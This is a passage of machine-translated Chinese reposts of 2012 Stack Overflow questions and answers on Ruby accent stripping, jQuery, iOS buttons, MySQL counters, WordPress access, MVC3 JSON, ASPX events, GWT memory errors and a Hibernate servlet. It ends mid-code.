# ruby - 在没有 Rails 的情况下替换 Ruby 1.9.3 中的重音字符

> ID：11091494
> 
> 赞同：2
> 
> 时间：2012-06-18T21:40:16.000
> 
> 标签：ruby, character-encoding

我想使用 Ruby 1.9.3 将重音 UTF-8 字符替换为它们的 ASCII 等效字符。例如，

```
Acsády  -->  Acsady 
```

执行此操作的传统方法是使用 IConv 包，它是 Ruby 标准库的一部分。你可以这样做：

```
str = 'Acsády'
IConv.iconv('ascii//TRANSLIT', 'utf8', str) 
```

哪个会产生

```
Acsa'dy 
```

然后必须删除撇号。虽然这种方法在 Ruby 1.9.3 中仍然有效，但我收到一条警告说`IConv is deprecated and that String#encode should be used instead`. 但是，`String#encode`不提供完全相同的功能。默认情况下，未定义的字符会抛出异常，但您可以通过设置 :undef=>:replace （将未定义的字符替换为默认的 '?' 字符）或 :fallback 选项到将未定义的源编码字符映射到的哈希值来处理它们目标编码。我想知道标准库中或通过某些 gem 是否有标准的 :fallback 哈希，这样我就不必编写自己的哈希来处理所有可能的重音符号。

@raina77ow：感谢您的回复。这正是我一直在寻找的。但是，在查看您链接到的线程后，我意识到更好的解决方案可能是简单地将非重音字符与其重音等价物匹配，就像数据库使用字符集排序规则一样。Ruby 有什么等同于排序规则的东西吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-04-01T09:02:18.620

我用这个：

```
def convert_to_ascii(s)
  undefined = ''
  fallback = { 'À' => 'A', 'Á' => 'A', 'Â' => 'A', 'Ã' => 'A', 'Ä' => 'A',
               'Å' => 'A', 'Æ' => 'AE', 'Ç' => 'C', 'È' => 'E', 'É' => 'E',
               'Ê' => 'E', 'Ë' => 'E', 'Ì' => 'I', 'Í' => 'I', 'Î' => 'I',
               'Ï' => 'I', 'Ñ' => 'N', 'Ò' => 'O', 'Ó' => 'O', 'Ô' => 'O',
               'Õ' => 'O', 'Ö' => 'O', 'Ø' => 'O', 'Ù' => 'U', 'Ú' => 'U',
               'Û' => 'U', 'Ü' => 'U', 'Ý' => 'Y', 'à' => 'a', 'á' => 'a',
               'â' => 'a', 'ã' => 'a', 'ä' => 'a', 'å' => 'a', 'æ' => 'ae',
               'ç' => 'c', 'è' => 'e', 'é' => 'e', 'ê' => 'e', 'ë' => 'e',
               'ì' => 'i', 'í' => 'i', 'î' => 'i', 'ï' => 'i', 'ñ' => 'n',
               'ò' => 'o', 'ó' => 'o', 'ô' => 'o', 'õ' => 'o', 'ö' => 'o',
               'ø' => 'o', 'ù' => 'u', 'ú' => 'u', 'û' => 'u', 'ü' => 'u',
               'ý' => 'y', 'ÿ' => 'y' }
  s.encode('ASCII',
           fallback: lambda { |c| fallback.key?(c) ? fallback[c] : undefined })
end 
```

您可以[在此处检查您可能想要为其提供后备的其他符号](http://www.utf8-chartable.de/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:49:56.523

我想您要查找的内容与[此问题](https://stackoverflow.com/questions/11058211/how-to-convert-letters-with-accents-umlauts-etc-to-their-ascii-counterparts-in)类似。如果是，您可以使用为 Ruby 编写的 Text::Unidecode 的端口——例如[这个](https://github.com/norman/unidecoder)gem（或者它的[这个](https://github.com/TalentBox/unidecoder)分支，看起来它已经准备好在 1.9 中使用）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-07-11T17:47:38.887

以下代码适用于各种各样的欧洲语言，包括希腊语，这很难正确处理，并且以前的答案没有处理。

```
# Code generated by code at https://stackoverflow.com/a/68338690/1142217
# See notes there on how to add characters to the list.
def remove_accents(s)
  return s.unicode_normalize(:nfc).tr("ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÑÒÓÔÕÖØÙÚÛÜÝàáâãäåæçèéêëìíîïñòóôõöøùúûüýÿΆΈΊΌΐάέήίΰϊϋόύώỏἀἁἂἃἄἅἆἈἉἊἌἍἎἐἑἒἓἔἕἘἙἜἝἠἡἢἣἤἥἦἧἨἩἫἬἭἮἯἰἱἲἳἴἵἶἷἸἹἼἽἾὀὁὂὃὄὅὈὉὊὋὌὍὐὑὓὔὕὖὗὙὝὠὡὢὣὤὥὦὧὨὩὫὬὭὮὯὰὲὴὶὸὺὼᾐᾑᾓᾔᾕᾖᾗᾠᾤᾦᾧᾰᾱᾳᾴᾶᾷᾸᾹῂῃῄῆῇῐῑῒῖῗῘῙῠῡῢῥῦῨῩῬῳῴῶῷῸ","AAAAAAÆCEEEEIIIINOOOOOOUUUUYaaaaaaæceeeeiiiinoooooouuuuyyΑΕΙΟιαεηιυιυουωoαααααααΑΑΑΑΑΑεεεεεεΕΕΕΕηηηηηηηηΗΗΗΗΗΗΗιιιιιιιιΙΙΙΙΙοοοοοοΟΟΟΟΟΟυυυυυυυΥΥωωωωωωωωΩΩΩΩΩΩΩαεηιουωηηηηηηηωωωωααααααΑΑηηηηηιιιιιΙΙυυυρυΥΥΡωωωωΟ")
end 
```

它是由以下长而缓慢的程序生成的，该程序会输出到 linux 命令行实用程序“unicode”。如果您遇到此列表中缺少的字符，请将它们添加到较长的程序中，重新运行它，您将获得处理这些字符的代码输出。例如，我认为该列表缺少一些出现在捷克语中的字符，例如带有楔形的 ac，以及带有长音符号的拉丁语元音。如果这些新字符的重音不在下面的列表中，程序将不会删除它们，直到您将新重音的名称添加到`names_of_accents`.

```
$stderr.print %q{
This program generates ruby code to strip accents from characters in Latin and Greek scripts.
Progress will be printed to stderr, the final result to stdout.
}

all_characters = %q{
         ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÑÒÓÔÕÖØÙÚÛÜÝàáâãäåæçèéêëìíîïñòóôõöøùúûüýÿ
         ΆΈΊΌΐάέήίϊόύώỏἀἁἃἄἅἈἐἑἒἔἕἘἙἜἡἢἣἤἥἦἨἩἫἬἮἰἱἲἴἵἶἸὀὁὂὃὄὅὊὍὐὑὓὔὕὖὗὝὡὢὣὤὥὧὨὩὰὲὴὶὸὺὼᾐᾗᾳᾴᾶῂῆῇῖῥῦῳῶῷῸᾤᾷἂἷ
         ὌᾖὉἧἷἂῃἌὬὉἷὉἷῃὦἌἠἳᾔἉᾦἠἳᾔὠᾓὫἝὈἭἼϋὯῴἆῒῄΰῢἆὙὮᾧὮᾕὋἍἹῬἽᾕἓἯἾᾠἎῗἾῗἯἊὭἍᾑᾰῐῠᾱῑῡᾸῘῨᾹῙῩ
}.gsub(/\s/,'')
# The first line is a list of accented Latin characters. The second and third lines are polytonic Greek.
# The Greek on this list includes every character occurring in the Project Gutenberg editions of Homer, except for some that seem to be
# mistakes (smooth rho, phi and theta in symbol font). Duplications and characters out of order in this list have no effect at run time.
# Also includes vowels with macron and vrachy, which occur in Project Perseus texts sometimes.

# The following code shells out to the linux command-line utility called "unicode," which is installed as the debian package
# of the same name.
# Documentation: https://github.com/garabik/unicode/blob/master/README

names_of_accents = %q{
  acute grave circ and rough smooth ypogegrammeni diar with macron vrachy tilde ring above diaeresis cedilla stroke
  tonos dialytika hook perispomeni dasia varia psili oxia
}.split(/\s+/).select { |x| x.length>0}.sort.uniq
# The longer "circumflex" will first be shortened to "circ" in later code.

def char_to_name(c)
  return `unicode --string "#{c}" --format "{name}"`.downcase
end

def name_to_char(name)
   list = `unicode "#{name}" --format "{pchar}" --max 0` # returns a string of possibilities, not just exact matches
   # Usually, but not always, the unaccented character is the first on the list.
   list.chars.each { |c|
     if char_to_name(c)==name then return c end
   }
   raise "Unable to convert name #{name} to a character, list=#{list}."
end

regex = "( (#{names_of_accents.join("|")}))+"
from = ''
to = ''
all_characters.chars.sort.uniq.each { |c|
  name = char_to_name(c).gsub(/circumflex/,'circ')
  name.gsub!(/#{regex}/,'')
  without_accent = name_to_char(name)
  from = from+c.unicode_normalize(:nfc)
  to = to+without_accent.unicode_normalize(:nfc)
  $stderr.print c
}
$stderr.print "\n"
print %Q{
# Code generated by code at https://stackoverflow.com/a/68338690/1142217
# See notes there on how to add characters to the list.
def remove_accents(s)
  return s.unicode_normalize(:nfc).tr("#{from}","#{to}")
end
} 
```

# javascript - 加载时更改 div 内容

> ID：11091497
> 
> 赞同：0
> 
> 时间：2012-06-18T21:40:18.777
> 
> 标签：javascript, jquery

我正在尝试编写一个脚本，当页面加载时，更改 2 个 div 内的内容。目前脚本应该只将变量放在 div 中，但我的下一步将是使用数组编写相同的脚本。目前脚本不起作用，我不知道为什么......我必须使用 AJAX 而不是 .html()？这页纸：

```
<div class="think_infobox">
            <h4 class="infbox" id="infbox_title">
                original title
            </h4>
            <p class="infbox" id="infbox_body">
               original body
            </p> 
```

剧本

```
$(document).ready(function(){
    var title = 'my new title';
    var body = 'my new body';
    $(#infbox_title).html(title);
    $(#infbox_body).html(body);
}); 
```

jsFiddle [http://jsfiddle.net/G8F9a/上的相同代码](http://jsfiddle.net/G8F9a/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:42:28.860

您忘记了`"`id 前后的字符（单引号也很好）。它应该是这样的：

```
$("#infbox_title").html(title); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T21:42:35.593

您的选择器必须在双引号或单引号内，如下所示：

```
$(document).ready(function(){
    var title = 'my new title';
    var body = 'my new body';
    $('#infbox_title').html(title);
    $('#infbox_body').html(body);
}); 
```

# iphone - 将 UIButton 图像更改为另一个目标 C

> ID：11091505
> 
> 赞同：0
> 
> 时间：2012-06-18T21:40:45.967
> 
> 标签：iphone, objective-c, xcode, image, uibutton

当用户按下它时，我想更改我的 UIButton 上的图像。图像具有透明效果（它是仅显示边缘的 .png）。问题是，当点击按钮时，一切正常（连接到它的其他功能），但应用程序会覆盖 2 个不同的图像一个超过一秒！按下按钮时，我想显示第二张图像，并删除第一张图像（这变得不必要）。PS：我不想使用图像数组。这里是按钮的代码：

```
UIButton *overlayButton = [UIButton buttonWithType:UIButtonTypeCustom];
[overlayButton setImage:[UIImage imageNamed:@"image1.png"] forState:UIControlStateNormal];
[overlayButton setFrame:CGRectMake(20, 382, 120, 60)];
[overlayButton addTarget:self action:@selector(scanButtonPressed) forControlEvents:UIControlEventTouchUpInside]; //just graphics
[overlayButton addTarget:self action:@selector(buttonshapeClicked:) forControlEvents:UIControlEventTouchUpInside]; //just to set a variable i++ for my cycle
[overlayButton addTarget:self action:@selector(changeshape:) forControlEvents:UIControlEventTouchUpInside];  //function that changes another shape
[[self view] addSubview:overlayButton]; 
```

我的简单循环

```
- (void)buttonshapeClicked:(id)sender{
shape++;
if (shape == 4) {
    shape = 1;
        }} 
```

这里是允许更改屏幕上主要形状的主要功能

```
 -(void) changeshape:(id)sender {
if (shape==1 && people==2) {
    //bottone forma
    UIButton *overlayButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [overlayButton setImage:[UIImage imageNamed:@"passaquadrato.png"] forState:UIControlStateNormal];
    [overlayButton setFrame:CGRectMake(20, 382, 120, 60)];
    [overlayButton addTarget:self action:@selector(scanButtonPressed) forControlEvents:UIControlEventTouchUpInside];
    [overlayButton addTarget:self action:@selector(buttonshapeClicked:) forControlEvents:UIControlEventTouchUpInside];
    [overlayButton addTarget:self action:@selector(changeshape:) forControlEvents:UIControlEventTouchUpInside];
    [[self view] addSubview:overlayButton];

    //bottone people
    UIButton *overlayButtonp = [UIButton buttonWithType:UIButtonTypeCustom];
    [overlayButtonp setImage:[UIImage imageNamed:@"passatre.png"] forState:UIControlStateNormal];
    [overlayButtonp setFrame:CGRectMake(180, 382, 120, 60)];
    [overlayButtonp addTarget:self action:@selector(scanButtonPressed) forControlEvents:UIControlEventTouchUpInside];
    [[self view] addSubview:overlayButtonp];

    UIImageView *overlayImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"circle2.png"]];
    [overlayImageView setFrame:CGRectMake(20, 88, 280, 280)];
    [[self view] addSubview:overlayImageView];
}

else if (shape==2 && people==2) {
    //bottone forma
    UIButton *overlayButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [overlayButton setImage:[UIImage imageNamed:@"passarettangolo.png"] forState:UIControlStateNormal];
    [overlayButton setFrame:CGRectMake(20, 382, 120, 60)];
    [overlayButton addTarget:self action:@selector(scanButtonPressed) forControlEvents:UIControlEventTouchUpInside];
    [overlayButton addTarget:self action:@selector(buttonshapeClicked:) forControlEvents:UIControlEventTouchUpInside];
    [overlayButton addTarget:self action:@selector(changeshape:) forControlEvents:UIControlEventTouchUpInside];
    [[self view] addSubview:overlayButton];

    //bottone people
    UIButton *overlayButtonp = [UIButton buttonWithType:UIButtonTypeCustom];
    [overlayButtonp setImage:[UIImage imageNamed:@"passatre.png"] forState:UIControlStateNormal];
    [overlayButtonp setFrame:CGRectMake(180, 382, 120, 60)];
    [overlayButtonp addTarget:self action:@selector(scanButtonPressed) forControlEvents:UIControlEventTouchUpInside];
    [[self view] addSubview:overlayButtonp];

    UIImageView *overlayImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"square2.png"]];
    [overlayImageView setFrame:CGRectMake(20, 88, 280, 280)];
    [[self view] addSubview:overlayImageView];
}} 
```

我想要相同的按钮，但要显示不同的图像

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:57:45.773

看起来您从未删除过以前的按钮。

此外，您不必创建新按钮 - 您可以简单地存储对按钮的引用、*更改*图像并*更改*操作目标（通过在添加新按钮之前删除旧按钮）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T07:38:22.650

我已经解决了几个周期，从视图中删除所有内容：

```
for (int i = 0; i < [[self.view subviews] count]; i++ ) {
        [[[self.view subviews] objectAtIndex:i] removeFromSuperview];
    } 
```

现在的问题是重新初始化循环，因为当我的变量变为 4 时，我希望它变为 1。我这样做：

```
- (void)buttonshapeClicked:(id)sender{shape++;
if (shape == 4) {
    shape = 1;
}} 
```

但是在数字 4 之后，我遇到了和以前一样的概览问题！

# mysql - 每个外键的自动增量

> ID：11091508
> 
> 赞同：0
> 
> 时间：2012-06-18T21:40:58.670
> 
> 标签：mysql, database

我有一个具有 UNIQUE id 自动递增的表，以及另一个表的外键，我想添加表 col，它将为每个外键自动递增。

例子：

如果此查询后的表是空的：

```
INSERT INTO `table` (job_id) VALUES (1),(1),(1),(2),(2),(1),(2),(3) ; 
```

桌子看起来像这样：

```
id | job_id | id2
0     1        1
1     1        2
2     1        3
3     2        1
4     2        2
5     1        4
6     2        3
7     3        1 
```

我尝试在插入行时将 id2 设置为 null，并且在它运行此查询之后：

```
UPDATE `table` AS t1 SET t1.`rid2` = ( SELECT COUNT( t2.`id` )
FROM `table` AS t2
WHERE t2.`job_id` = t2.`job_id`
AND t2.`id` < t1.`id` )
WHERE r1.`d2` = NULL 
```

有什么建议么？

# html - 允许登录的 Wordpress 用户读取 HTML 页面的文件夹

> ID：11091510
> 
> 赞同：1
> 
> 时间：2012-06-18T21:41:01.850
> 
> 标签：html, wordpress, directory, logged

我在根文件夹中安装了一个 wordpress 站点。根目录下是一个 /docs 文件夹，其中包含一堆较旧的 html 文件。我想只允许登录的 wordpress 用户能够访问那些 /docs html 页面（不要与 wordpress 的“页面”混淆）。

我创建了一个 Wordpress“门户”页面，如果访问者登录，它会显示指向 /docs 页面的链接。我还想输入一个文本搜索功能（我知道该怎么做），以便登录的访问者可以获得一个列表相关 /docs html 页面

我不知道该怎么做是防止未登录的访问者直接访问链接和搜索的 /docs 页面？

我知道如果我将 html 页面转换为 php 并检查引用者，我可以做到这些。但如果可能的话，我不想重做所有旧的 html（如果我必须这样做的话——我只会将它们导入到 wordpress 分类中——但我希望避免这种情况！）

我查看了 .htaccess，希望设置一个 ENV 变量或使用 REFERER，但我一直在读到这些东西不可靠。

想法？

TIA,

---JC

# javascript - 尝试从 MVC3 中的 JSON 解析模型数据

> ID：11091512
> 
> 赞同：0
> 
> 时间：2012-06-18T21:41:09.127
> 
> 标签：javascript, json, asp.net-mvc-3

我有一个项目，我需要有两个单独的 JSON 列表，这意味着我不能在我的控制器中使用 JsonResult，所以我需要解析客户端。我使用以下内容将我的列表解析为 Json，然后从[Newtonsoft.Json](http://james.newtonking.com/projects/json/help/)包中将字符串发送到我的视图模型中：

```
Model.JsonAllActiveItems = JsonConvert.SerializeObject(Model.AllActiveItems,Formatting.None); 
```

然后在我的脚本文件中说：

```
function setActiveList(list) {
    alert(list)//for test
    activeList = JSON.parse(list);  
}; 
```

解析命令后，我不断收到错误“Uncaught SyntaxError: Unexpected token o”

如果它有帮助的话，JSON字符串如下：

```
[{"ProductCompositions":[],"ImageName":"Item1","Version":0,"StatusInt":0,"Status":0,"Id":1},{"ProductCompositions":[],"ImageName":"Item2","Version":0,"StatusInt":1,"Status":0,"Id":2},{"ProductCompositions":[],"ImageName":"Item3","Version":0,"StatusInt":1,"Status":0,"Id":4},{"ProductCompositions":[],"ImageName":"Item2","Version":0,"StatusInt":0,"Status":0,"Id":5},{"ProductCompositions":[],"ImageName":"Item4","Version":0,"StatusInt":0,"Status":0,"Id":6},{"ProductCompositions":[],"ImageName":"Item4","Version":0,"StatusInt":0,"Status":0,"Id":7}] 
```

有任何想法吗？干杯

**更新：**奇怪的是，在 Chrome javascript 调试器中，“list”甚至在 parse 命令之前就已经正确填充了正确的数据。但是，当我尝试在不使用 JSON.parse() 的情况下对其进行测试时，如下所示，我得到一个空字符串，例如 list is null：

```
 var myString = "";
for (var i = 0; i < list.length; i++ ) {
    myString += "<li>" + list[i].ImageName + "</li>";
}
document.getElementById("selected-items-comp").innerHtml = myString; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:39:44.077

所以问题是，如果您将 Newtonsoft.Json dll 与 MVC3 一起使用，则无需在 JavaScript 中解析 JSON。这种魔法发生在幕后。我无法在我的测试中得到任何东西的原因是我是一个 jQuery 菜鸟并且做到了

```
document.getElementById("selected-items-comp").innerHtml = myString; 
```

代替

```
$('#selected-items-comp').html(myString); 
```

现在它起作用了。

# ios - ios exc_bad_access 因为延迟调度

> ID：11091514
> 
> 赞同：0
> 
> 时间：2012-06-18T21:41:19.697
> 
> 标签：ios, nsurlconnection, exc-bad-access, sendasynchronousrequest

```
[NSURLConnection sendAsynchronousRequest:req queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *error) {
    dispatch_async(dispatch_get_main_queue(), ^{
        if(data != nil && self.superview != nil) { // <-- EXC_BAD_ACCESS on this line
            [self.musicItemImg setAlpha:0.0];
            [self.musicItemImg setImage:[UIImage imageWithData:data]];
            [UIView animateWithDuration:0.25 animations:^{
                [self.musicItemImg setAlpha:1.0];
            }];
        }
    });
}]; 
```

有时这个视图在异步加载完成之前被删除，当它尝试使用时，`self`我得到了一个`EXC_BAD_ACCESS`可以理解的结果。我可以中止异步连接吗？还是有更好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:57:18.297

首先，在 UIView 子类中启动 url 请求是非常糟糕的风格。您应该在视图控制器中执行此操作！

NSOperationQueue 应该是视图控制器的类实例。此外，您需要在完成处理程序中配置的视图必须是类实例（属性）。对所有请求使用相同的操作队列。在 viewWillDisappear 中，您可以通过以下方式取消所有请求操作：

```
[self.operationQueue cancelAllOperations]; 
```

# c# - ASPX 在事件触发器上重新运行整个页面代码

> ID：11091515
> 
> 赞同：0
> 
> 时间：2012-06-18T21:41:24.093
> 
> 标签：c#, asp.net

我正在使用带有 ASPX 的 EXT.NET。我以前从未遇到过这个问题。当我有一个事件触发器时，页面会重新运行所有代码（尽管它实际上并没有“重新加载”页面）。据我所知，这并没有发生在所有其他页面上。示例代码：

```
protected void gSelectApplied(object sender,EventArgs e)
{
    Ext.Net.ComboBox box = (Ext.Net.ComboBox)sender;
    string name = box.ID;
    switch (name)
    {
        case "gPreviousApplied":
            {
                gPreviousAppliedfunded.Hidden = box.SelectedItem.Value.ToString() == "Yes" 
                    ? false 
                    : true;
                break;
            }
        case "gPreviousAppliedfunded":
            {
                gPreviousApplied.Hidden = box.SelectedItem.Value.ToString() == "Yes"
                    ? false
                    : true;
                break;
            }

    }

} 
```

这会执行并且应该隐藏页面上的元素。然而，这不会发生，因为它会将 hidden 设置为 true 片刻（甚至不可见），然后它会被重置回来。当我在常规页面中设置断点时，它会在触发事件时触发断点，然后触发事件代码本身。

前端看起来是这样的：

```
<ext:FormPanel ID="Sec5" runat="server" AutoHeight="true" BodyBorder="false"
            Layout="FormLayout" LabelAlign="Right" LabelPad="25" LabelWidth="220" Cls="blue"
            PaddingSummary="5px 0px 5px 115px" Border="false" BaseCls=".uData" Hidden="false">
            <Items>
                <ext:ComboBox FieldLabel="someField" ID="gPreviousApplied"
                    runat="server" OnDirectSelect="gSelectApplied">
                    <Items>
                        <ext:ListItem Text="Yes" />
                        <ext:ListItem Text="No" />
                    </Items>
                </ext:ComboBox>
                <ext:ComboBox FieldLabel="something" ID="gPreviousAppliedfunded"
                    runat="server">
                    <Items>
                        <ext:ListItem Text="Yes" />
                        <ext:ListItem Text="No" />
                    </Items>
                </ext:ComboBox>
                <ext:ComboBox FieldLabel="somethingelse" ID="gPreviousApplied" 
                    runat="server">
                    <Items>
                        <ext:ListItem Text="Yes" />
                        <ext:ListItem Text="No" />
                    </Items>
                </ext:ComboBox>
            </Items>
        </ext:FormPanel>
    </Items>
</ext:Panel> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T07:17:51.263

请检查 aspx 页面中的 autoeventwireup 是否设置为 false。还要检查 page_load 中是否有任何东西将元素设置回 false。在 page_load 函数中使用 page.ispostback

# java - 线程“主”java.lang.OutOfMemoryError 中的异常：GWT 应用程序中超出了 GC 开销限制

> ID：11091516
> 
> 赞同：13
> 
> 时间：2012-06-18T21:41:27.137
> 
> 标签：java, google-app-engine, gwt

我正在使用 GWT 和 GAE 开发应用程序。当我尝试重建它或创建一个工件时，我得到了很多错误，如下图所示。

我搜索了 google 和 Stack Overflow，我得到了一些答案，但没有针对我的特定问题。

据我了解，我得到了错误，因为我的垃圾收集器消耗了大量内存。

![在此处输入图像描述](../Images/87f52d5e93bfc72adabb0ea18719a10b.png)

这是主要错误`Exception in thread "main" java.lang.OutOfMemoryError: GC overhead limit exceeded`。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-19T07:11:44.350

好的，我解决了这个问题。只是增加虚拟机编译项目所需的内存。以前它是 128，现在我将它更改为 512。随着项目的增长，它需要更多的内存来编译项目的类。这是在 Injtellj IDEA 中执行此操作的方法。右键项目模块 -> 打开模块设置 -> 模块 -> GWT -> 编译器最大堆大小（Mb） -> 更改为 512。

![在此处输入图像描述](../Images/36439a9197028280d559e866da697a50.png)

***注意：在 Ideal Intellij 12+ 中，项目设置位于：文件 -> 项目结构或 Ctrl+Alrt+Shitf+S***

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-05-13T10:04:48.950

我遇到了同样的问题

```
Exception in thread “main” java.lang.OutOfMemoryError: GC overhead limit exceeded 
```

当我试图修复这个错误时，它显示了同样的错误。所以不要惊慌，只需通过在 Run->Run Configurations->Click on arguments->inside VM arguments type 中设置此选项来增加大小

```
 -Xms1024M -Xmx2048M 
```

Xms- 最小限制

Xmx- 最大限制

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-26T02:09:36.087

Adio 的回答是正确的，除了当我们添加“gwt-mobile”库时我需要将其更改为 1000Mb - 512 Mb 仍然给我“GC 开销限制”错误。我认为 128Mb 是一个相当糟糕的默认值——即使我们开始编写应用程序时，它也对我们不起作用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-03-07T12:10:19.517

通过 netbeans 中的项目属性更改配置不起作用。

我的解决方案是编辑 nbproject/gwt.properties：

```
# Additional JVM arguments for the GWT compiler
gwt.compiler.jvmargs=-Xmx1024M 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-01-02T17:10:52.103

我尝试了网上许多帖子中的所有建议，但没有一个奏效。经过多次试验，最后我发现在 OSX 上使用 G1GC 垃圾收集器对我来说有很大的不同。如果您使用的是 ANT，那么您必须确保构建文件使用 G1GC 垃圾收集器启动编译器

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-07-23T20:31:15.203

在 NetBeans 8.2 中执行以下操作

右键单击项目名称 -> 属性 -> Google Web Toolkit

将 JVM 参数修改为 -Xmx512M

点击确定

再次运行

这适用于 Windows 10、Netbeans 8.2、GWT 2.8.2、JDK 1.8

# android - Servlet 与 Hibernate 通信

> ID：11091517
> 
> 赞同：1
> 
> 时间：2012-06-18T21:41:34.807
> 
> 标签：android, hibernate

晚安，

在我的应用程序中，我通过 Hibernate 访问我的数据库。我想从用户发送 JSON 数据

涉及hibernate表（User）的代码如下：

```
<hibernate-mapping>
<class name="modelos.Usuario" table="usuario" catalog="mydb">
    <id name="login" type="string">
        <column name="login" length="20" />
        <generator class="assigned" />
    </id>
    <many-to-one name="rol" class="modelos.Rol" fetch="join">
        <column name="Rol_idRol" not-null="true" />
    </many-to-one>
    <property name="password" type="string">
        <column name="password" length="32" />
    </property>
    <property name="nombre" type="string">
        <column name="nombre" length="45" />
    </property>
    <property name="apellidos" type="string">
        <column name="apellidos" length="45" />
    </property>
    <property name="dni" type="string">
        <column name="dni" length="10" />
    </property>
    <property name="direccion" type="string">
        <column name="direccion" length="60" />
    </property>
    <property name="numero" type="string">
        <column name="numero" length="5" />
    </property>
    <property name="poblacion" type="string">
        <column name="poblacion" length="45" />
    </property>
    <property name="cp" type="string">
        <column name="cp" length="5" />
    </property>
    <property name="provincia" type="string">
        <column name="provincia" length="30" />
    </property>
    <property name="email" type="string">
        <column name="email" length="60" />
    </property>
    <property name="telefono" type="string">
        <column name="telefono" length="15" />
    </property>
    <set name="reunions" table="reunion" inverse="true" lazy="false" fetch="join">
        <key>
            <column name="Perfil_login" length="20" not-null="true" />
        </key>
        <one-to-many class="modelos.Reunion" />
    </set>
    <set name="cuentas" table="cuenta" inverse="true" lazy="false" fetch="join">
        <key>
            <column name="usuario_login" length="20" not-null="true" />
        </key>
        <one-to-many class="modelos.Cuenta" />
    </set>
    <set name="sesions" table="sesion" inverse="true" lazy="false" fetch="join">
        <key>
            <column name="usuario_login" length="20" not-null="true" />
        </key>
        <one-to-many class="modelos.Sesion" />
    </set>
</class> 
```

并生成以下 Java 代码：

```
package modelos; 
```

// 由 Hibernate Tools 3.4.0.CR1 于 19-abr-2012 18:48:54 生成

导入 java.util.HashSet；导入 java.util.Set；

/** * hbm2java 生成的 Usuario */ public class Usuario implements java.io.Serializable {

```
 private String login;
 private Rol rol;
 private String password;
 private String nombre;
 private String apellidos;
 private String dni;
 private String direccion;
 private String numero;
 private String poblacion;
 private String cp;
 private String provincia;
 private String email;
 private String telefono;
 private Set<Reunion> reunions = new HashSet<Reunion>(0);
 private Set<Cuenta> cuentas = new HashSet<Cuenta>(0);
 private Set<Sesion> sesions = new HashSet<Sesion>(0);

public Usuario() {
}

public Usuario(String login, Rol rol) {
    this.login = login;
    this.rol = rol;
}
public Usuario(String login, Rol rol, String password, String nombre, String apellidos, String dni, String direccion, String numero, String poblacion, String cp, String provincia, String email, String telefono, Set<Reunion> reunions, Set<Cuenta> cuentas, Set<Sesion> sesions) {
   this.login = login;
   this.rol = rol;
   this.password = password;
   this.nombre = nombre;
   this.apellidos = apellidos;
   this.dni = dni;
   this.direccion = direccion;
   this.numero = numero;
   this.poblacion = poblacion;
   this.cp = cp;
   this.provincia = provincia;
   this.email = email;
   this.telefono = telefono;
   this.reunions = reunions;
   this.cuentas = cuentas;
   this.sesions = sesions;
}

public String getLogin() {
    return this.login;
}

public void setLogin(String login) {
    this.login = login;
}
public Rol getRol() {
    return this.rol;
}

public void setRol(Rol rol) {
    this.rol = rol;
}
public String getPassword() {
    return this.password;
}

public void setPassword(String password) {
    this.password = password;
}
public String getNombre() {
    return this.nombre;
}

public void setNombre(String nombre) {
    this.nombre = nombre;
}
public String getApellidos() {
    return this.apellidos;
}

public void setApellidos(String apellidos) {
    this.apellidos = apellidos;
}
public String getDni() {
    return this.dni;
}

public void setDni(String dni) {
    this.dni = dni;
}
public String getDireccion() {
    return this.direccion;
}

public void setDireccion(String direccion) {
    this.direccion = direccion;
}
public String getNumero() {
    return this.numero;
}

public void setNumero(String numero) {
    this.numero = numero;
}
public String getPoblacion() {
    return this.poblacion;
}

public void setPoblacion(String poblacion) {
    this.poblacion = poblacion;
}
public String getCp() {
    return this.cp;
}

public void setCp(String cp) {
    this.cp = cp;
}
public String getProvincia() {
    return this.provincia;
}

public void setProvincia(String provincia) {
    this.provincia = provincia;
}
public String getEmail() {
    return this.email;
}

public void setEmail(String email) {
    this.email = email;
}
public String getTelefono() {
    return this.telefono;
}

public void setTelefono(String telefono) {
    this.telefono = telefono;
}
public Set<Reunion> getReunions() {
    return this.reunions;
}

public void setReunions(Set<Reunion> reunions) {
    this.reunions = reunions;
}
public Set<Cuenta> getCuentas() {
    return this.cuentas;
}

public void setCuentas(Set<Cuenta> cuentas) {
    this.cuentas = cuentas;
}
public Set<Sesion> getSesions() {
    return this.sesions;
}

public void setSesions(Set<Sesion> sesions) {
    this.sesions = sesions;
} 
```

}

执行用户更新的 servlet 具有以下代码：

```
 if (opcion.equals("4")){

        response.setContentType("text/html");

        Rol rol = new Rol();

        String usuario = request.getParameter("login");
        Usuario user = facade.getUsuarioByLogin(usuario);

        String nombre= user.getNombre();
        String apellidos = user.getApellidos();
        String dni = user.getDni();
        String telefono = user.getTelefono();
        String email = user.getEmail();
        String direccion = user.getDireccion();
        String numero = user.getNumero();
        String poblacion = user.getPoblacion();
        String cp = user.getCp();
        String provincia = user.getProvincia();
        String login = user.getLogin();
        String contraseña = user.getPassword();
        rol = user.getRol();

        System.out.println("El valor de Nombre es"+nombre);

        //System.out.println("Opcion 4 El valor de rol es"+rol);

        JSONObject jsonObject1 = new JSONObject();
